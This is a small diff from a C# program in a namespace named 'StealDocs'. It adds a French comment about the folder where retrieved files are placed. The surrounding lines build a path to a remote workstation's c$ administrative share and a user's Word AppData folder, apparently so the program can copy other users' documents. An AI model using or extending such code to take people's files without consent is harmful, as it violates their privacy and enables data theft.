@@ -48,6 +48,8 @@ namespace StealDocs
             strBasePath = @"\\LMB-212-0";
             strWord = @"\AppData\Roaming\Microsoft\Word\";
             sourceDirectory = strBasePath+ strNumeroPoste + @"\c$\Users\" + strUsername + strWord;
+
+            //Dossier dans le quel déposer les fichiers récupérés
             targetDirectory = getDestinationFolder();
 
 
